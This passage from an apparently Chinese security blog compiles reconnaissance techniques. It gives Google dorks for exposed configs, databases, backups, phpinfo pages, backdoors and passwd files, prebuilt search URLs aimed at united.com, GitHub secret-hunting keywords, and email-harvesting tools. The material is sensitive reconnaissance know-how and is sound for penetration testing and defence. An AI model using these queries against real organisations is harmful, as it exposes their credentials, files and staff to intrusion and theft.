inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http</span><br></pre></td></tr></table></figure><h4 id="SQL错误"><a href="#SQL错误" class="headerlink" title="SQL错误"></a>SQL错误</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure><h4 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure><h4 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure><h4 id="数据库文件泄露"><a href="#数据库文件泄露" class="headerlink" title="数据库文件泄露"></a>数据库文件泄露</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure><h4 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.log</span><br></pre></td></tr></table></figure><h4 id="备份和历史文件泄露"><a href="#备份和历史文件泄露" class="headerlink" title="备份和历史文件泄露"></a>备份和历史文件泄露</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure><h4 id="公开文件泄露"><a href="#公开文件泄露" class="headerlink" title="公开文件泄露"></a>公开文件泄露</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure><h4 id="邮箱信息"><a href="#邮箱信息" class="headerlink" title="邮箱信息"></a>邮箱信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件</span><br><span class="line">site:target.com email</span><br></pre></td></tr></table></figure><h4 id="社工信息"><a href="#社工信息" class="headerlink" title="社工信息"></a>社工信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</span><br></pre></td></tr></table></figure><h3 id="Dorks"><a href="#Dorks" class="headerlink" title="Dorks"></a>Dorks</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Code share sites</span></span><br><span class="line">site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net &quot;company&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GitLab/GitHub/Bitbucket</span></span><br><span class="line">site:github.com | site:gitlab.com | site:bitbucket.org &quot;company&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stackoverflow</span></span><br><span class="line">site:stackoverflow.com &quot;target.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Project management sites</span></span><br><span class="line">site:http://trello.com | site:*.atlassian.net &quot;company&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pastebin-like sites</span></span><br><span class="line">site:http://justpaste.it | site:http://pastebin.com &quot;company&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Config files</span></span><br><span class="line">site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Database files</span></span><br><span class="line">site:target.com ext:sql | ext:dbf | ext:mdb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Backup files</span></span><br><span class="line">site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.git folder</span></span><br><span class="line">inurl:&quot;/.git&quot; target.com -github</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposed documents</span></span><br><span class="line">site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Other files</span></span><br><span class="line">site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo &quot;published by the PHP Group&quot; | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:&quot;/phpinfo.php&quot; | inurl:&quot;.htaccess&quot; | ext:swf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SQL errors</span></span><br><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:&quot;Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PHP errors</span></span><br><span class="line">site:target.com &quot;PHP Parse error&quot; | &quot;PHP Warning&quot; | &quot;PHP Error&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Login pages</span></span><br><span class="line">site:target.com inurl:signup | inurl:register | intitle:Signup</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open redirects</span></span><br><span class="line">site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Apache Struts RCE</span></span><br><span class="line">site:target.com ext:action | ext:struts | ext:do</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Search <span class="keyword">in</span> pastebin</span></span><br><span class="line">site:pastebin.com target.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linkedin employees</span></span><br><span class="line">site:linkedin.com employees target.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Wordpress files</span></span><br><span class="line">site:target.com inurl:wp-content | inurl:wp-includes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Subdomains</span></span><br><span class="line">site:*.target.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sub-subdomains</span></span><br><span class="line">site:*.*.target.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Find S3 Buckets</span></span><br><span class="line">site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com &quot;target&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Traefik</span></span><br><span class="line">intitle:traefik inurl:8080/dashboard &quot;target&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jenkins</span></span><br><span class="line">intitle:&quot;Dashboard [Jenkins]&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Other 3rd parties sites</span></span><br><span class="line">https://www.google.com/search?q=site%3Agitter.im%20%7C%20site%3Apapaly.com%20%7C%20site%3Aproductforums.google.com%20%7C%20site%3Acoggle.it%20%7C%20site%3Areplt.it%20%7C%20site%3Aycombinator.com%20%7C%20site%3Alibraries.io%20%7C%20site%3Anpm.runkit.com%20%7C%20site%3Anpmjs.com%20%7C%20site%3Ascribd.com%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Backup files</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20ext%3Abkf%20%7C%20ext%3Abkp%20%7C%20ext%3Abak%20%7C%20ext%3Aold%20%7C%20ext%3Abackup</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Login pages</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Asignup%20%7C%20inurl%3Aregister%20%7C%20intitle%3ASignup</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Config files</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20ext%3Axml%20%7C%20ext%3Aconf%20%7C%20ext%3Acnf%20%7C%20ext%3Areg%20%7C%20ext%3Ainf%20%7C%20ext%3Ardp%20%7C%20ext%3Acfg%20%7C%20ext%3Atxt%20%7C%20ext%3Aora%20%7C%20ext%3Aenv%20%7C%20ext%3Aini</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.git folder</span></span><br><span class="line">https://www.google.com/search?q=inurl%3A%5C%22%2F.git%5C%22%20united.com%20-github</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Database files</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20ext%3Asql%20%7C%20ext%3Adbf%20%7C%20ext%3Amdb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open redirects</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Aredir%20%7C%20inurl%3Aurl%20%7C%20inurl%3Aredirect%20%7C%20inurl%3Areturn%20%7C%20inurl%3Asrc%3Dhttp%20%7C%20inurl%3Ar%3Dhttp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Code share sites</span></span><br><span class="line">https://www.google.com/search?q=site%3Asharecode.io%20%7C%20site%3Acontrolc.com%20%7C%20site%3Acodepad.co%20%7Csite%3Aideone.com%20%7C%20site%3Acodebeautify.org%20%7C%20site%3Ajsdelivr.com%20%7C%20site%3Acodeshare.io%20%7C%20site%3Acodepen.io%20%7C%20site%3Arepl.it%20%7C%20site%3Ajsfiddle.net%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pastebin-like sites</span></span><br><span class="line">https://www.google.com/search?q=site%3Ajustpaste.it%20%7C%20site%3Aheypasteit.com%20%7C%20site%3Apastebin.com%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linkedin employees</span></span><br><span class="line">https://www.google.com/search?q=site%3Alinkedin.com%20employees%20united.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Project management sites</span></span><br><span class="line">https://www.google.com/search?q=site%3Atrello.com%20%7C%20site%3A*.atlassian.net%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Other files</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20intitle%3Aindex.of%20%7C%20ext%3Alog%20%7C%20ext%3Aphp%20intitle%3Aphpinfo%20%5C%22published%20by%20the%20PHP%20Group%5C%22%20%7C%20inurl%3Ashell%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Awso%20%7C%20inurl%3Acmd%20%7C%20shadow%20%7C%20passwd%20%7C%20boot.ini%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Areadme%20%7C%20inurl%3Alicense%20%7C%20inurl%3Ainstall%20%7C%20inurl%3Asetup%20%7C%20inurl%3Aconfig%20%7C%20inurl%3A%5C%22%2Fphpinfo.php%5C%22%20%7C%20inurl%3A%5C%22.htaccess%5C%22%20%7C%20ext%3Aswf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sub-subdomains</span></span><br><span class="line">https://www.google.com/search?q=site%3A*.*.united.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jenkins</span></span><br><span class="line">https://www.google.com/search?q=intitle%3A%5C%22Dashboard%20%5BJenkins%5D%5C%22%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Traefik</span></span><br><span class="line">https://www.google.com/search?q=intitle%3Atraefik%20inurl%3A8080%2Fdashboard%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cloud buckets S3/GCP</span></span><br><span class="line">https://www.google.com/search?q=site%3A.s3.amazonaws.com%20%7C%20site%3Astorage.googleapis.com%20%7C%20site%3Aamazonaws.com%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SQL errors</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20intext%3A%5C%22sql%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22syntax%20error%20has%20occurred%5C%22%20%7C%20intext%3A%5C%22incorrect%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22unexpected%20end%20of%20SQL%20command%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_connect()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_query()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20pg_connect()%5C%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposed documents</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20ext%3Adoc%20%7C%20ext%3Adocx%20%7C%20ext%3Aodt%20%7C%20ext%3Apdf%20%7C%20ext%3Artf%20%7C%20ext%3Asxw%20%7C%20ext%3Apsw%20%7C%20ext%3Appt%20%7C%20ext%3Apptx%20%7C%20ext%3Apps%20%7C%20ext%3Acsv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Wordpress files</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Awp-content%20%7C%20inurl%3Awp-includes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Apache Struts RCE</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20ext%3Aaction%20%7C%20ext%3Astruts%20%7C%20ext%3Ado</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GitLab/GitHub/Bitbucket</span></span><br><span class="line">https://www.google.com/search?q=site%3Agithub.com%20%7C%20site%3Agitlab.com%20%7C%20site%3Abitbucket.org%20%22united%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Subdomains</span></span><br><span class="line">https://www.google.com/search?q=site%3A*.united.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stackoverflow</span></span><br><span class="line">https://www.google.com/search?q=site%3Astackoverflow.com%20%22united.com%22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PHP errors</span></span><br><span class="line">https://www.google.com/search?q=site%3Aunited.com%20%5C%22PHP%20Parse%20error%5C%22%20%7C%20%5C%22PHP%20Warning%5C%22%20%7C%20%5C%22PHP%20Error%5C%22</span><br></pre></td></tr></table></figure><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul><li>Github高级搜索：<a href="https://github.com/search/advanced">https://github.com/search/advanced</a></li><li>GitDorker：<a href="https://github.com/obheda12/GitDorker">https://github.com/obheda12/GitDorker</a></li><li>gitdorks_go：<a href="https://github.com/damit5/gitdorks_go">https://github.com/damit5/gitdorks_go</a></li></ul><p>keywords：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&quot;token&quot;</span><br><span class="line">&quot;password&quot;</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">&quot;passwd&quot;</span><br><span class="line">&quot;username&quot;</span><br><span class="line">&quot;key&quot;</span><br><span class="line">&quot;apidocs&quot;</span><br><span class="line">&quot;appspot&quot;</span><br><span class="line">&quot;auth&quot;</span><br><span class="line">&quot;aws_access&quot;</span><br><span class="line">&quot;config&quot;</span><br><span class="line">&quot;credentials&quot;</span><br><span class="line">&quot;dbuser&quot;</span><br><span class="line">&quot;ftp&quot;</span><br><span class="line">&quot;login&quot;</span><br><span class="line">&quot;mailchimp&quot;</span><br><span class="line">&quot;mailgun&quot;</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">&quot;pass&quot;</span><br><span class="line">&quot;pem private&quot;</span><br><span class="line">&quot;prod&quot;</span><br><span class="line">&quot;pwd&quot;</span><br><span class="line">&quot;secure&quot;</span><br><span class="line">&quot;ssh&quot;</span><br><span class="line">&quot;staging&quot;</span><br><span class="line">&quot;stg&quot;</span><br><span class="line">&quot;stripe&quot;</span><br><span class="line">&quot;swagger&quot;</span><br><span class="line">&quot;testuser&quot;</span><br><span class="line">&quot;jdbc&quot;</span><br></pre></td></tr></table></figure><p>除了 Github 外，还有一些其他的代码平台：</p><ul><li>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></li><li>Gitee: <a href="https://gitee.com/">https://gitee.com/</a></li><li>Bitbucket: <a href="https://bitbucket.org/">https://bitbucket.org/</a></li></ul><h2 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h2><p>Stackoverflow：<a href="https://stackoverflow.com/">https://stackoverflow.com/</a></p><p>Stack Overflow 日志：</p><ul><li><a href="https://archive.org/details/stackexchange">https://archive.org/details/stackexchange</a></li><li><a href="https://archive.org/download/stackexchange">https://archive.org/download/stackexchange</a></li></ul><p>敏感信息可能包括：</p><ul><li>github key</li><li>简历&#x2F;邮箱&#x2F;手机号</li></ul><h2 id="社交平台"><a href="#社交平台" class="headerlink" title="社交平台"></a>社交平台</h2><p>结合 Google Search</p><ul><li>语雀：<a href="https://www.yuque.com/dashboard">https://www.yuque.com/dashboard</a></li><li>印象识堂：<a href="https://www.yinxiang.com/everhub/">https://www.yinxiang.com/everhub/</a></li><li>wolai：<a href="https://www.wolai.com/">https://www.wolai.com/</a></li><li>腾讯文档：<a href="https://docs.qq.com/">https://docs.qq.com</a></li><li>飞书文档：<a href="https://docs.feishu.cn/">https://docs.feishu.cn</a></li><li>蓝湖：<a href="https://lanhuapp.com/">https://lanhuapp.com/</a></li></ul><h2 id="历史页面"><a href="#历史页面" class="headerlink" title="历史页面"></a>历史页面</h2><ul><li>Wayback Machine：<a href="https://archive.org/web">https://archive.org/web</a></li><li>waybackurls：<a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></li><li>gau：<a href="https://github.com/lc/gau">https://github.com/lc/gau</a></li></ul><h2 id="网盘"><a href="#网盘" class="headerlink" title="网盘"></a>网盘</h2><ul><li>搜索导航：e.g. <a href="https://adzhp.xyz/sites/3983.html">https://adzhp.xyz/sites/3983.html</a></li><li>聚合搜索：e.g. <a href="https://www.chaonengsou.com/">https://www.chaonengsou.com/</a></li><li>蓝奏云：<a href="https://www.lanzoux.com/">https://www.lanzoux.com</a></li><li>天翼云：<a href="https://www.ctyun.cn/">https://www.ctyun.cn</a></li><li>阿里云盘：<a href="https://www.aliyundrive.com/">https://www.aliyundrive.com</a></li><li>城通网盘：<a href="https://www.ctfile.com/">https://www.ctfile.com</a></li><li>夸克网盘：<a href="https://pan.quark.cn/">https://pan.quark.cn</a></li><li>新浪微盘</li></ul><h2 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h2><ul><li>Hunter：<a href="https://hunter.io/">https://hunter.io</a></li><li>Snov.io：<a href="https://app.snov.io/">https://app.snov.io</a></li><li>Phonebook：also works on subdomains and urls <a href="https://phonebook.cz/">https://phonebook.cz</a></li><li>Skymem：<a href="https://www.skymem.info/">https://www.skymem.info</a></li><li>email-format：<a href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a></li><li>搜邮箱：<a href="https://souyouxiang.com/find-contact/">https://souyouxiang.com/find-contact/</a></li><li>theHarvester：also works on subdomains <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></li></ul><h3 id="Hunter"><a href="#Hunter" class="headerlink" title="Hunter"></a>Hunter</h3><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124162353785.png"></p><h3 id="Snov-io"><a href="#Snov-io" class="headerlink" title="Snov.io"></a>Snov.io</h3><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163506452.png"></p><h3 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h3><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163603784.png"></p><h3 id="Skymem"><a href="#Skymem" class="headerlink" title="Skymem"></a>Skymem</h3><p><img src="/images%5C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5Cimage-20231124163743384.png"></p><h3 id="email-format"><a href="#email-format" class="headerlink" title="email-format"></a>email-format</h3><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163836496.png"></p><h3 id="搜邮箱"><a href="#搜邮箱" class="headerlink" title="搜邮箱"></a>搜邮箱</h3><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163031668.png"></p><h3 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h3><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124164253796.png"><br></style></p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻防知识 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
